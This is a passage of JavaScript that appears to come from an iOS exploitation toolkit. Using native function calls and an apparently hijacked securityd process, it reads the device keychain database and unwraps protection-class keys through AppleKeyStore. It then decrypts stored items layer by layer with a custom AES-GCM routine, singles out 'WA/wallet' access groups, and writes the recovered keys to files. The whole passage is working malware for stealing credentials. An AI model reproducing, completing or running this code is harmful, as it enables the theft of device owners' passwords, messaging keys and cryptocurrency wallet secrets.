								var fn = tag >> 3, wt = tag & 7;
								if (fn === 3 && wt === 0) {
									var v = 0; shift = 0;
									do {
										if (i >= end) return 0;
										b = blobU8[i++];
										v |= (b & 0x7f) << shift;
										shift += 7;
									} while (b & 0x80);
									return v >>> 0;
								}
								if (wt === 0) {
									do { if (i >= end) return 0; b = blobU8[i++]; } while (b & 0x80);
								} else if (wt === 2) {
									var ln = 0; shift = 0;
									do {
										if (i >= end) return 0;
										b = blobU8[i++];
										ln |= (b & 0x7f) << shift;
										shift += 7;
									} while (b & 0x80);
									i += ln;
								} else if (wt === 5) i += 4;
								else if (wt === 1) i += 8;
								else break;
							}
							return 0;
						}
						if (p7_agrpFilter) {
							// Prefer PRE class set; skip second peek when PRE already filtered jobs.
							if (pre && pre.classes && Object.keys(pre.classes).length) {
								p7_neededClasses = pre.classes;
								p7_flog("WA-early classes from PRE n=" + Object.keys(pre.classes).length);
								p7_result.diagnostics.waEarlyClasses = Object.keys(pre.classes).length;
								p7_result.diagnostics.waEarlyFromPre = true;
							} else {
							p7_neededClasses = {};
							var p7_needN = 0;
							var p7_peekStmtBuf = BigInt(N.callSymbol("calloc", 1, 8));
							var p7_peekSql = "SELECT rowid, data FROM genp" + peP7AgrpSqlWhere() + " LIMIT " + peP7MaxRows();
							var p7_peekRc = Number(N.callSymbol("sqlite3_prepare_v2", p7_db, p7_peekSql, -1, p7_peekStmtBuf, 0n));
							p7_flog("WA-early peek prepare rc=" + p7_peekRc);
							if (p7_peekRc === p7_SQLITE_OK) {
								var p7_peekStmt = N.read64(p7_peekStmtBuf);
								var p7_peekRows = 0;
								while (Number(N.callSymbol("sqlite3_step", p7_peekStmt)) === p7_SQLITE_ROW) {
									p7_peekRows++;
									var p7_peekBlob = BigInt(N.callSymbol("sqlite3_column_blob", p7_peekStmt, 1));
									var p7_peekLen = Number(N.callSymbol("sqlite3_column_bytes", p7_peekStmt, 1));
									if (!p7_peekBlob || p7_peekBlob === 0n || p7_peekLen < 8 || p7_peekLen > 65536) continue;
									var p7_peekU8 = new Uint8Array(N.read(p7_peekBlob, p7_peekLen));
									var p7_pc = p7_peekProtClass(p7_peekU8);
									if (p7_pc > 0 && !p7_neededClasses[p7_pc]) {
										p7_neededClasses[p7_pc] = 1;
										p7_needN++;
										p7_flog("WA-early need class=" + p7_pc + " (row " + p7_peekRows + ")");
									}
								}
								N.callSymbol("sqlite3_finalize", p7_peekStmt);
								p7_flog("WA-early peek rows=" + p7_peekRows + " classes=" + p7_needN);
								p7_result.diagnostics.waEarlyClasses = p7_needN;
							} else {
								p7_flog("WA-early peek FAILED - fallback unwrap ALL metakeys");
								p7_neededClasses = null;
							}
							N.callSymbol("free", p7_peekStmtBuf);
							p7_flushLog();
							}
						}

						// --- Unwrap metadata keys from PRE jobs (no re-query during RC) ---
						p7_flog("RC unwrap PRE jobs=" + ((pre && pre.jobs) ? pre.jobs.length : 0));
						var p7_metaKeys = {};
						var p7_mkCount = 0;
						var p7_preJobs = (pre && pre.jobs) ? pre.jobs : [];
						for (var p7_ji = 0; p7_ji < p7_preJobs.length; p7_ji++) {
							if (p7_rcDead) {
								p7_flog("metakey loop abort: RC dead");
								break;
							}
							var p7_job = p7_preJobs[p7_ji];
							var p7_kc = Number(p7_job.kc);
							var p7_localWrap = p7_job.wrap;
							var p7_wrapLen = Number(p7_job.wrapLen || (p7_localWrap ? p7_localWrap.length : 0));
							if (!p7_localWrap || p7_wrapLen < 40) continue;
							p7_flog("metakey class=" + p7_kc + " wrapLen=" + p7_wrapLen + " (PRE)");
							if (p7_aksReady) {
								var p7_unwrap = p7_aksUnwrap(p7_kc, p7_localWrap.buffer || p7_localWrap, p7_wrapLen);
								if (p7_unwrap && p7_unwrap.kr === 0 && p7_unwrap.data) {
									var p7_keyArr = new Uint8Array(p7_unwrap.data);
									p7_metaKeys[p7_kc] = p7_keyArr;
									p7_result.metadataKeys[p7_kc] = {status: "ok", len: p7_unwrap.outSize};
									p7_mkCount++;
									p7_flog("  class " + p7_kc + " unwrapped OK (" + p7_unwrap.outSize + "B)");
								} else {
									var p7_ukr = p7_unwrap ? p7_unwrap.kr : -1;
									p7_result.metadataKeys[p7_kc] = {status: "failed", kr: p7_ukr};
									p7_flog("  class " + p7_kc + " unwrap FAILED kr=" + p7_ukr);
								}
							}
						}
						p7_flog("metadatakeys: " + p7_mkCount + " unwrapped from PRE jobs=" + p7_preJobs.length);
						p7_result.diagnostics.metadataKeysUnwrapped = p7_mkCount;
						p7_result.diagnostics.preJobs = p7_preJobs.length;
						try {
							if (typeof peP7WriteClassKeysFile === "function")
								peP7WriteClassKeysFile(p7_metaKeys);
							st.classkeys = true;
							p7_result.diagnostics.classkeysWritten = p7_mkCount;
						} catch (p7_ckE) {
							p7_flog("classkeys write ERR: " + p7_ckE);
						}
						p7_flushLog();

						if (p7_rcDead) {
							p7_flog("RC dead after metakey - skip table decrypt (no more AKS)");
						}
						st.phase = "rc_4a";
						p7_flog("=== [4a] table scan + AKS blob3 (GCM local; destroy RC after) ===");

						// --- Check local CommonCrypto availability ---
						var p7_symCCCreate = p7_toPtr(N.callSymbol("dlsym", 0xfffffffffffffffen, "CCCryptorCreate"));
						var p7_hasCrypto = p7_symCCCreate !== 0n;
						p7_flog("Local CCCryptorCreate=0x" + p7_symCCCreate.toString(16));
						p7_result.diagnostics.hasCrypto = p7_hasCrypto;
						p7_flushLog();

						// Local AES-GCM with tag verification
						// Uses CCCryptorCreate(7args) + CCCryptorUpdate(6args) for AES-ECB,
						// then JavaScript for CTR mode + GHASH tag computation
						function p7_aesEcbEncrypt(keyPtr, ctx, localIn, localOut, movedBuf, block16) {
							N.write(localIn, block16.buffer);
							N.callSymbol("CCCryptorUpdate", ctx, localIn, 16n, localOut, 16n, movedBuf);
							return new Uint8Array(N.read(localOut, 16));
						}
						function p7_gf128Mul(X, Y) {
							var Z = new Uint8Array(16);
							var V = new Uint8Array(Y);
							for (var i = 0; i < 128; i++) {
								if (X[i >> 3] & (0x80 >> (i & 7)))
									for (var j = 0; j < 16; j++) Z[j] ^= V[j];
								var lsb = V[15] & 1;
								for (var j = 15; j > 0; j--) V[j] = (V[j] >>> 1) | ((V[j-1] & 1) << 7);
								V[0] >>>= 1;
								if (lsb) V[0] ^= 0xe1;
							}
							return Z;
						}
						function p7_gcmDeriveJ0(H, iv, ivLen) {
							var j0 = new Uint8Array(16);
							if (ivLen === 12) {
								for (var i = 0; i < 12; i++) j0[i] = iv[i];
								j0[15] = 1;
							} else {
								var g = new Uint8Array(16);
								var nBlk = Math.ceil(ivLen / 16);
								for (var i = 0; i < nBlk; i++) {
									var off = i * 16, rem = Math.min(16, ivLen - off);
									for (var j = 0; j < rem; j++) g[j] ^= iv[off + j];
									g = p7_gf128Mul(g, H);
								}
								var lb = new Uint8Array(16);
								var ivBits = ivLen * 8;
								lb[12] = (ivBits >>> 24) & 0xff; lb[13] = (ivBits >>> 16) & 0xff;
								lb[14] = (ivBits >>> 8) & 0xff; lb[15] = ivBits & 0xff;
								for (var j = 0; j < 16; j++) g[j] ^= lb[j];
								j0 = p7_gf128Mul(g, H);
							}
							return j0;
						}
						function p7_gcmInc32(block) {
							var c = new Uint8Array(block);
							for (var k = 15; k >= 12; k--) { c[k]++; if (c[k] !== 0) break; }
							return c;
						}
						function p7_gcmDecrypt(key32, iv, ivLen, ct, ctLen, tag, tagLen) {
							if (!key32 || !ct || ctLen <= 0) return null;
							var localKey = p7_toPtr(N.callSymbol("malloc", 32));
							N.write(localKey, key32.buffer || key32);
							var ctxBuf = p7_toPtr(N.callSymbol("calloc", 1, 8));
							var cr = Number(N.callSymbol("CCCryptorCreate",
								0n, 0n, 2n, localKey, 32n, 0n, ctxBuf));
							if (cr !== 0) {
								p7_flog("gcm: CCCryptorCreate failed cr=" + cr);
								N.callSymbol("free", localKey); N.callSymbol("free", ctxBuf);
								return null;
							}
							var ctx = N.readPtr(ctxBuf);
							N.callSymbol("free", ctxBuf);
							var localIn = p7_toPtr(N.callSymbol("malloc", 16));
							var localOut = p7_toPtr(N.callSymbol("malloc", 16));
							var movedBuf = p7_toPtr(N.callSymbol("calloc", 1, 8));

							var H = p7_aesEcbEncrypt(localKey, ctx, localIn, localOut, movedBuf, new Uint8Array(16));
							var j0 = p7_gcmDeriveJ0(H, iv, ivLen);
							var ctr = p7_gcmInc32(j0);

							var plaintext = new Uint8Array(ctLen);
							var blockCount = Math.ceil(ctLen / 16);
							for (var b = 0; b < blockCount; b++) {
								var encCtr = p7_aesEcbEncrypt(localKey, ctx, localIn, localOut, movedBuf, ctr);
								var off = b * 16;
								var rem = Math.min(16, ctLen - off);
								for (var j = 0; j < rem; j++) plaintext[off + j] = ct[off + j] ^ encCtr[j];
								ctr = p7_gcmInc32(ctr);
							}

							var tagOk = true;
							if (tag && tagLen > 0) {
								var ghash = new Uint8Array(16);
								var ctBlocks = Math.ceil(ctLen / 16);
								for (var i = 0; i < ctBlocks; i++) {
									var off2 = i * 16;
									var rem2 = Math.min(16, ctLen - off2);
									for (var j = 0; j < rem2; j++) ghash[j] ^= ct[off2 + j];
									ghash = p7_gf128Mul(ghash, H);
								}
								var lenBlock = new Uint8Array(16);
								var ctBits = ctLen * 8;
								lenBlock[12] = (ctBits >>> 24) & 0xff; lenBlock[13] = (ctBits >>> 16) & 0xff;
								lenBlock[14] = (ctBits >>> 8) & 0xff; lenBlock[15] = ctBits & 0xff;
								for (var j = 0; j < 16; j++) ghash[j] ^= lenBlock[j];
								ghash = p7_gf128Mul(ghash, H);
								var encJ0 = p7_aesEcbEncrypt(localKey, ctx, localIn, localOut, movedBuf, j0);
								var computedTag = new Uint8Array(16);
								for (var j = 0; j < 16; j++) computedTag[j] = ghash[j] ^ encJ0[j];
								tagOk = true;
								for (var j = 0; j < Math.min(tagLen, 16); j++) {
									if (computedTag[j] !== tag[j]) { tagOk = false; break; }
								}
							}

							N.callSymbol("CCCryptorRelease", ctx);
							N.callSymbol("free", localKey);
							N.callSymbol("free", localIn);
							N.callSymbol("free", localOut);
							N.callSymbol("free", movedBuf);
							if (!tagOk) {
								p7_flog("GCM TAG MISMATCH ct=" + ctLen + " iv=" + ivLen);
								p7_result.diagnostics.tagMismatches = (p7_result.diagnostics.tagMismatches || 0) + 1;
							}
							return plaintext.buffer;
						}

						// --- V7 blob parser helpers ---
						function p7_parseVarint(buf, offset) {
							var val = 0, shift = 0, i = offset;
							while (i < buf.length) {
								var b = buf[i++];
								val |= (b & 0x7F) << shift;
								if (!(b & 0x80)) break;
								shift += 7;
							}
							return {value: val, nextOffset: i};
						}

						function p7_parseProtobuf(data) {
							var buf = new Uint8Array(data);
							var fields = {};
							var i = 0;
							while (i < buf.length) {
								var tagInfo = p7_parseVarint(buf, i);
								i = tagInfo.nextOffset;
								var fieldNum = tagInfo.value >> 3;
								var wireType = tagInfo.value & 0x7;
								if (wireType === 0) {
									var v = p7_parseVarint(buf, i);
									fields["f" + fieldNum + "_varint"] = v.value;
									i = v.nextOffset;
								} else if (wireType === 2) {
									var lenInfo = p7_parseVarint(buf, i);
									i = lenInfo.nextOffset;
									var chunk = buf.slice(i, i + lenInfo.value);
									if (!fields["f" + fieldNum]) fields["f" + fieldNum] = [];
									fields["f" + fieldNum].push(chunk);
									i += lenInfo.value;
								} else {
									break;
								}
							}
							return fields;
						}

						function p7_parseBplist(buf) {
							if (buf.length < 40) return null;
							if (buf[0]!==0x62||buf[1]!==0x70||buf[2]!==0x6c||buf[3]!==0x69||buf[4]!==0x73||buf[5]!==0x74) return null;
							var tOff = buf.length - 32;
							var oiSz = buf[tOff+6], orSz = buf[tOff+7];
							var nObj = 0; for (var i=0;i<8;i++) nObj = nObj*256 + buf[tOff+8+i];
							var topIdx = 0; for (var i=0;i<8;i++) topIdx = topIdx*256 + buf[tOff+16+i];
							var otOff = 0; for (var i=0;i<8;i++) otOff = otOff*256 + buf[tOff+24+i];
							function rdSz(off, sz) { var v=0; for(var i=0;i<sz;i++) v=v*256+buf[off+i]; return v; }
							var offsets = [];
							for (var i=0;i<nObj;i++) offsets.push(rdSz(otOff+i*oiSz, oiSz));
							function parseObj(idx) {
								if (idx<0||idx>=nObj) return null;
								var off = offsets[idx];
								var marker = buf[off];
								var hi = marker >> 4, lo = marker & 0xf;
								if (hi===0) { return lo===0?null:lo===8?false:lo===9?true:null; }
								if (hi===1) { var n=1<<lo; var v=0; for(var i=0;i<n;i++) v=v*256+buf[off+1+i]; return v; }
								if (hi===4) {
									var dLen=lo; var dOff=off+1;
									if (lo===0xf) { var x=buf[off+1]; dLen=rdSz(off+2,1<<(x&0xf)); dOff=off+2+(1<<(x&0xf)); }
									return buf.slice(dOff, dOff+dLen);
								}
								if (hi===5) {
									var sLen=lo; var sOff=off+1;
									if (lo===0xf) { var x=buf[off+1]; sLen=rdSz(off+2,1<<(x&0xf)); sOff=off+2+(1<<(x&0xf)); }
									var s=""; for(var i=0;i<sLen;i++) s+=String.fromCharCode(buf[sOff+i]); return s;
								}
								if (hi===6) {
									var sLen=lo; var sOff=off+1;
									if (lo===0xf) { var x=buf[off+1]; sLen=rdSz(off+2,1<<(x&0xf)); sOff=off+2+(1<<(x&0xf)); }
									var s=""; for(var i=0;i<sLen;i++) s+=String.fromCharCode((buf[sOff+i*2]<<8)|buf[sOff+i*2+1]); return s;
								}
								if (hi===8) { var v=0; for(var i=0;i<=lo;i++) v=v*256+buf[off+1+i]; return {_uid:v}; }
								if (hi===0xa) {
									var aLen=lo; var aOff=off+1;
									if (lo===0xf) { var x=buf[off+1]; aLen=rdSz(off+2,1<<(x&0xf)); aOff=off+2+(1<<(x&0xf)); }
									var arr=[]; for(var i=0;i<aLen;i++) arr.push(rdSz(aOff+i*orSz,orSz)); return {_arr:arr};
								}
								if (hi===0xd) {
									var dLen=lo; var dOff=off+1;
									if (lo===0xf) { var x=buf[off+1]; dLen=rdSz(off+2,1<<(x&0xf)); dOff=off+2+(1<<(x&0xf)); }
									var keys=[],vals=[];
									for(var i=0;i<dLen;i++) keys.push(rdSz(dOff+i*orSz,orSz));
									for(var i=0;i<dLen;i++) vals.push(rdSz(dOff+dLen*orSz+i*orSz,orSz));
									var d={}; for(var i=0;i<dLen;i++) { var k=parseObj(keys[i]); if(typeof k==="string") d[k]=vals[i]; }
									return {_dict:d};
								}
								return null;
							}
							return {parseObj:parseObj, topIdx:topIdx, nObj:nObj};
						}
						function p7_parseBplistCiphertext(bplistData) {
							var bp = p7_parseBplist(bplistData);
							if (!bp) return null;
							var topObj = bp.parseObj(bp.topIdx);
							if (!topObj || !topObj._dict) return null;
							var objsIdx = topObj._dict["$objects"];
							var topDIdx = topObj._dict["$top"];
							if (objsIdx===undefined || topDIdx===undefined) return null;
							var objsRef = bp.parseObj(objsIdx);
							var topD = bp.parseObj(topDIdx);
							if (!objsRef||!objsRef._arr||!topD||!topD._dict) return null;
							var objArr = objsRef._arr;
							var rootRef = topD._dict["root"];
							if (rootRef===undefined) return null;
							var rootUid = bp.parseObj(rootRef);
							var rootIdx = rootUid && rootUid._uid !== undefined ? rootUid._uid : (typeof rootRef==="number" ? rootRef : -1);
							if (rootIdx < 0 || rootIdx >= objArr.length) return null;
							var rootObj = bp.parseObj(objArr[rootIdx]);
							if (!rootObj||!rootObj._dict) return null;
							function getUid(key) {
								var ref = rootObj._dict[key];
								if (ref===undefined) return -1;
								var u = bp.parseObj(ref);
								if (u && u._uid !== undefined) return u._uid;
								return typeof ref==="number"? ref : -1;
							}
							var ivIdx = getUid("SFInitializationVector");
							var ctIdx = getUid("SFCiphertext");
							var tagIdx = getUid("SFAuthenticationCode");
							if (tagIdx < 0) tagIdx = getUid("SFAuthenticationTag");
							if (ivIdx<0||ivIdx>=objArr.length||ctIdx<0||ctIdx>=objArr.length) return null;
							var ivData = bp.parseObj(objArr[ivIdx]);
							var ctData = bp.parseObj(objArr[ctIdx]);
							if (!(ivData instanceof Uint8Array) || !(ctData instanceof Uint8Array)) return null;
							var tag = null;
							if (tagIdx >= 0 && tagIdx < objArr.length) {
								var t = bp.parseObj(objArr[tagIdx]);
								if (t instanceof Uint8Array) tag = t;
							}
							var ct = ctData;
							if (!tag && ct.length > 16) {
								tag = ct.slice(ct.length - 16);
								ct = ct.slice(0, ct.length - 16);
							}
							return {iv: ivData, ct: ct, tag: tag};
						}

						// --- TLV decoder ---
						function p7_decodeTLV(data) {
							var buf = new Uint8Array(data);
							var attrs = {};
							var i = 0;
							// Outer: tag 0x30 or 0x31 (SEQUENCE/SET)
							if (buf.length < 4) return attrs;
							if (buf[0] === 0x30 || buf[0] === 0x31) {
								var outerLen = buf[1];
								if (outerLen === 0x82) {
									outerLen = (buf[2] << 8) | buf[3];
									i = 4;
								} else if (outerLen === 0x81) {
									outerLen = buf[2];
									i = 3;
								} else {
									i = 2;
								}
							}
							while (i + 2 < buf.length) {
								var seqTag = buf[i++];
								if (seqTag !== 0x30) break;
								var seqLen = buf[i++];
								if (seqLen === 0x81) { seqLen = buf[i++]; }
								else if (seqLen === 0x82) { seqLen = (buf[i] << 8) | buf[i+1]; i += 2; }
								var seqEnd = i + seqLen;
								if (seqEnd > buf.length) break;
								// Inside: key string tag (0x0C UTF8String or 0x18 GeneralizedTime) + value
								var keyTag = buf[i++];
								var keyLen = buf[i++];
								if (keyLen === 0x81) { keyLen = buf[i++]; }
								var keyStr = "";
								for (var ki = 0; ki < keyLen && (i + ki) < buf.length; ki++)
									keyStr += String.fromCharCode(buf[i + ki]);
								i += keyLen;
								if (i < seqEnd) {
									var valTag = buf[i++];
									var valLen = buf[i++];
									if (valLen === 0x81) { valLen = buf[i++]; }
									else if (valLen === 0x82) { valLen = (buf[i] << 8) | buf[i+1]; i += 2; }
									if (valTag === 0x0C || valTag === 0x18 || valTag === 0x16) {
										var valStr = "";
										for (var vi = 0; vi < valLen && (i + vi) < buf.length; vi++)
											valStr += String.fromCharCode(buf[i + vi]);
										attrs[keyStr] = valStr;
									} else if (valTag === 0x04) {
										var valBytes = buf.slice(i, i + valLen);
										var hex = "";
										for (var hi = 0; hi < valBytes.length; hi++)
											hex += ("0" + valBytes[hi].toString(16)).slice(-2);
										attrs[keyStr] = hex;
										attrs[keyStr + "_raw"] = valBytes;
									} else if (valTag === 0x02) {
										var intVal = 0;
										for (var ii = 0; ii < valLen && (i + ii) < buf.length; ii++)
											intVal = (intVal << 8) | buf[i + ii];
										attrs[keyStr] = intVal;
									}
									i += valLen;
								}
								i = seqEnd;
							}
							return attrs;
						}

						// --- Table scan + decrypt ---
						p7_flog("=== Table scan + decrypt ===");
						p7_flushLog();
						var p7_blob3Map = {};
						var p7_tableNames = ["genp", "inet", "cert", "keys"];
						var p7_MAX_ROWS = 2000;
						// Filtered mode: genp only (WA/wallet agrps); empty filter = full tables
						if (p7_agrpFilter) {
							p7_tableNames = ["genp"];
							p7_MAX_ROWS = peP7MaxRows();
							p7_flog("agrpFilter=" + p7_agrpFilter + " -> genp only MAX=" + p7_MAX_ROWS);
						}

						for (var p7_ti = 0; p7_ti < p7_tableNames.length; p7_ti++) {
							var p7_tbl = p7_tableNames[p7_ti];
							p7_flog("table[" + p7_ti + "]=" + p7_tbl + " starting...");
							var p7_items = [];
							var p7_tStmt = BigInt(N.callSymbol("calloc", 1, 8));
							var p7_tSql = "SELECT rowid, data FROM " + p7_tbl + " LIMIT " + p7_MAX_ROWS;
							if (p7_agrpFilter && p7_tbl === "genp") {
								// agrp column is plaintext; svce/acct/data encrypted
								p7_tSql = "SELECT rowid, data FROM genp" + peP7AgrpSqlWhere() + " LIMIT " + p7_MAX_ROWS;
							}
							var p7_tRc = Number(N.callSymbol("sqlite3_prepare_v2", p7_db, p7_tSql, -1, p7_tStmt, 0n));
							p7_flog(p7_tbl + " prepare rc=" + p7_tRc + " sql=" + p7_tSql.slice(0, 80));
							if (p7_tRc !== p7_SQLITE_OK) {
								p7_flog(p7_tbl + " prepare FAILED");
								N.callSymbol("free", p7_tStmt);
								p7_result.tables[p7_tbl] = {error: "prepare rc=" + p7_tRc, items: []};
								continue;
							}
							var p7_stmt = N.read64(BigInt(p7_tStmt));
							N.callSymbol("free", p7_tStmt);
							var p7_rowCount = 0;
							p7_flushLog();

							var p7_stepVal;
							while ((p7_stepVal = Number(N.callSymbol("sqlite3_step", p7_stmt))) === p7_SQLITE_ROW) {
								p7_rowCount++;
								try {
								if (p7_rowCount <= 3 || p7_rowCount % 50 === 0)
									p7_flog(p7_tbl + " row " + p7_rowCount);
								if (p7_rowCount === 1) { p7_flog("step1: column_int..."); p7_flushLog(); }
								var p7_rowid = Number(N.callSymbol("sqlite3_column_int", p7_stmt, 0));
								if (p7_rowCount === 1) { p7_flog("step2: rowid=" + p7_rowid + " column_blob..."); p7_flushLog(); }
								var p7_blobPtr = BigInt(N.callSymbol("sqlite3_column_blob", p7_stmt, 1));
								if (p7_rowCount === 1) { p7_flog("step3: blobPtr=0x" + p7_blobPtr.toString(16) + " column_bytes..."); p7_flushLog(); }
								var p7_blobLen = Number(N.callSymbol("sqlite3_column_bytes", p7_stmt, 1));
								if (p7_rowCount <= 3) p7_flog("  rid=" + p7_rowid + " blobPtr=0x" + p7_blobPtr.toString(16) + " blobLen=" + p7_blobLen);
								if (!p7_blobPtr || p7_blobPtr === 0n || p7_blobLen < 8) {
									p7_items.push({rowid: p7_rowid, error: "empty"});
									continue;
								}
								if (p7_blobLen > 65536) {
									p7_flog("WARN " + p7_tbl + " row " + p7_rowCount + " blobLen=" + p7_blobLen + " >64KB, skip");
									p7_items.push({rowid: p7_rowid, error: "blob_too_large len=" + p7_blobLen});
									continue;
								}
								if (p7_rowCount === 1) { p7_flog("step4: N.read(0x" + p7_blobPtr.toString(16) + ", " + p7_blobLen + ")..."); p7_flushLog(); }
								var p7_blobData = new Uint8Array(N.read(p7_blobPtr, p7_blobLen));
								if (p7_rowCount === 1) { p7_flog("step5: read OK, len=" + p7_blobData.length); p7_flushLog(); }
								var p7_version = p7_blobData[0] | (p7_blobData[1] << 8) | (p7_blobData[2] << 16) | (p7_blobData[3] << 24);
								var p7_item = {rowid: p7_rowid, _table: p7_tbl, version: p7_version};
								if (p7_rowCount <= 3) p7_flog("  v=" + p7_version + " first4=0x" + (p7_blobData[0].toString(16)) + (p7_blobData[1].toString(16)) + (p7_blobData[2].toString(16)) + (p7_blobData[3].toString(16)));

								try {
									var p7_pbData;
									if (p7_version >= 7 && p7_version <= 20) {
										p7_pbData = p7_blobData.slice(4);
									} else if (p7_blobData[0] === 0x0a || p7_blobData[0] === 0x08 || p7_blobData[0] === 0x12) {
										p7_pbData = p7_blobData;
										p7_item.version = 7;
					} else {
										p7_item.error = "unknown_format v=" + p7_version;
										p7_items.push(p7_item);
										continue;
									}

									var p7_pb = p7_parseProtobuf(p7_pbData.buffer);
									var p7_protClass = p7_pb.f3_varint || 0;
									p7_item.protectionClass = p7_protClass;
									if (p7_rowCount <= 3) p7_flog("  pb OK class=" + p7_protClass);

									// Extract nested fields
									// outer.1 -> f1[0] (nested: 1.1=bplistFirst, 1.2.1=blob3Key)
									// outer.2 -> f2[0] (nested: 2.1=bplistSecond, 2.2=bplistThird)
									var p7_bpFirst = null, p7_bpSecond = null, p7_bpThird = null, p7_blob3Key = null;

									if (p7_pb.f1 && p7_pb.f1[0]) {
										var p7_inner1 = p7_parseProtobuf(p7_pb.f1[0].buffer);
										if (p7_inner1.f1 && p7_inner1.f1[0]) p7_bpFirst = p7_inner1.f1[0];
										if (p7_inner1.f2 && p7_inner1.f2[0]) {
											var p7_inner12 = p7_parseProtobuf(p7_inner1.f2[0].buffer);
											if (p7_inner12.f1 && p7_inner12.f1[0]) p7_blob3Key = p7_inner12.f1[0];
										}
									}
									if (p7_pb.f2 && p7_pb.f2[0]) {
										var p7_inner2 = p7_parseProtobuf(p7_pb.f2[0].buffer);
										if (p7_inner2.f1 && p7_inner2.f1[0]) p7_bpSecond = p7_inner2.f1[0];
										if (p7_inner2.f2 && p7_inner2.f2[0]) p7_bpThird = p7_inner2.f2[0];
									}

									p7_item._blobSizes = {
										first: p7_bpFirst ? p7_bpFirst.length : 0,
										second: p7_bpSecond ? p7_bpSecond.length : 0,
										third: p7_bpThird ? p7_bpThird.length : 0,
										blob3: p7_blob3Key ? p7_blob3Key.length : 0
									};

									// Layer 1: GCM(bplistThird, metadataKey[class]) -> intermediate
									var p7_mkeyArr = p7_metaKeys[p7_protClass];
									if (!p7_mkeyArr) {
										p7_item.error = "no_metadata_key class=" + p7_protClass;
										p7_items.push(p7_item);
										continue;
									}

									if (p7_bpThird && p7_hasCrypto) {
										if (p7_rowCount <= 3) { p7_flog("  L1: parseBplist(third " + p7_bpThird.length + "B)..."); p7_flushLog(); }
										var p7_l1 = p7_parseBplistCiphertext(p7_bpThird);
										if (p7_rowCount <= 3) p7_flog("  L1: bplist=" + (p7_l1 ? "iv=" + (p7_l1.iv ? p7_l1.iv.length : "null") + " ct=" + (p7_l1.ct ? p7_l1.ct.length : "null") : "null"));
										if (p7_l1 && p7_l1.ct && p7_l1.iv) {
											if (p7_rowCount <= 3) { p7_flog("  L1: gcmDecrypt..."); p7_flushLog(); }
											var p7_interKey = p7_gcmDecrypt(p7_mkeyArr,
												p7_l1.iv, p7_l1.iv.length,
												p7_l1.ct, p7_l1.ct.length,
												p7_l1.tag, p7_l1.tag ? p7_l1.tag.length : 0);
											if (p7_rowCount <= 3) p7_flog("  L1: gcmResult=" + (p7_interKey ? p7_interKey.byteLength + "B" : "null"));
										if (p7_interKey) {
												var p7_interArr = new Uint8Array(p7_interKey);

												// Layer 2: GCM(bplistSecond, intermediateKey) -> metadata TLV
												if (p7_bpSecond) {
													if (p7_rowCount <= 3) { p7_flog("  L2: parseBplist(second)..."); p7_flushLog(); }
													var p7_l2 = p7_parseBplistCiphertext(p7_bpSecond);
													if (p7_rowCount <= 3) p7_flog("  L2: bplist=" + (p7_l2 ? "ok" : "null"));
											if (p7_l2 && p7_l2.ct && p7_l2.iv) {
														if (p7_rowCount <= 3) { p7_flog("  L2: gcmDecrypt..."); p7_flushLog(); }
														var p7_metaPt = p7_gcmDecrypt(
															p7_interArr.length >= 32 ? p7_interArr.slice(0, 32) : p7_interArr,
															p7_l2.iv, p7_l2.iv.length,
															p7_l2.ct, p7_l2.ct.length,
															p7_l2.tag, p7_l2.tag ? p7_l2.tag.length : 0);
														if (p7_metaPt) {
															var p7_metaAttrs = p7_decodeTLV(p7_metaPt);
															p7_item.service = p7_metaAttrs["svce"] || null;
															p7_item.account = p7_metaAttrs["acct"] || null;
															p7_item.accessGroup = p7_metaAttrs["agrp"] || null;
															p7_item.label = p7_metaAttrs["labl"] || null;
														} else { p7_item.layer2Error = "gcm_fail"; }
													} else { p7_item.layer2Error = "bplist_parse"; }
												}

												// Layer 3: AKS unwrap(blob3Key) + GCM(bplistFirst, blob3key) -> secret TLV
												if (p7_blob3Key && p7_bpFirst && p7_aksReady && !p7_rcDead) {
													if (p7_rowCount <= 3) { p7_flog("  L3: aksUnwrap(class=" + p7_protClass + " len=" + p7_blob3Key.length + ")..."); p7_flushLog(); }
													var p7_b3Unwrap = p7_aksUnwrap(p7_protClass, p7_blob3Key.buffer, p7_blob3Key.length);
													if (p7_rowCount <= 3) p7_flog("  L3: unwrap kr=" + (p7_b3Unwrap ? p7_b3Unwrap.kr : "null"));
												if (p7_b3Unwrap && p7_b3Unwrap.kr === 0 && p7_b3Unwrap.data) {
														var p7_b3Key = new Uint8Array(p7_b3Unwrap.data);
														try {
															p7_blob3Map[p7_tbl + ":" + p7_rowid] = (typeof peP7U8ToHex === "function")
																? peP7U8ToHex(p7_b3Key) : "";
														} catch (_) {}
														if (p7_rowCount <= 3) { p7_flog("  L3: parseBplist(first)..."); p7_flushLog(); }
														var p7_l3 = p7_parseBplistCiphertext(p7_bpFirst);
														if (p7_rowCount <= 3) p7_flog("  L3: bplist=" + (p7_l3 ? "ok" : "null"));
													if (p7_l3 && p7_l3.ct && p7_l3.iv) {
															if (p7_rowCount <= 3) { p7_flog("  L3: gcmDecrypt(secret)..."); p7_flushLog(); }
															var p7_secPt = p7_gcmDecrypt(
																p7_b3Key.length >= 32 ? p7_b3Key.slice(0, 32) : p7_b3Key,
																p7_l3.iv, p7_l3.iv.length,
																p7_l3.ct, p7_l3.ct.length,
																p7_l3.tag, p7_l3.tag ? p7_l3.tag.length : 0);
															if (p7_secPt) {
																var p7_secAttrs = p7_decodeTLV(p7_secPt);
																if (p7_secAttrs["v_Data"]) {
																	p7_item.dataHex = p7_secAttrs["v_Data"];
																}
															} else { p7_item.layer3Error = "gcm_fail"; }
														} else { p7_item.layer3Error = "bplist_parse"; }
													} else {
														p7_item.layer3Error = "aks_unwrap kr=" + (p7_b3Unwrap ? p7_b3Unwrap.kr : -1);
													}
												}
											} else { p7_item.layer1Error = "gcm_fail"; }
										} else { p7_item.layer1Error = "bplist_parse"; }
									} else if (!p7_bpThird) { p7_item.error = "no_bpThird"; }
								} catch (p7_decErr) {
									p7_item.error = "decrypt: " + p7_decErr;
								}
								p7_items.push(p7_item);
								} catch (p7_rowErr) {
									p7_flog(p7_tbl + " row " + p7_rowCount + " CRASH: " + p7_rowErr);
									p7_flushLog();
								}
							}
							N.callSymbol("sqlite3_finalize", p7_stmt);
							p7_flog(p7_tbl + ": " + p7_rowCount + " rows, " + p7_items.length + " processed");
							p7_result.tables[p7_tbl] = {count: p7_rowCount, items: p7_items};
							p7_flushLog();
						}

						// [4a] AKS finished (classkeys + filtered blob3). Destroy securityd before dump.
						try {
							if (typeof peP7WriteBlob3File === "function") peP7WriteBlob3File(p7_blob3Map);
						} catch (_) {}
						if (p7_secRC) {
							p7_flog("[4a] AKS done mk=" + p7_mkCount + " - destroy securityd before [4b] dump");
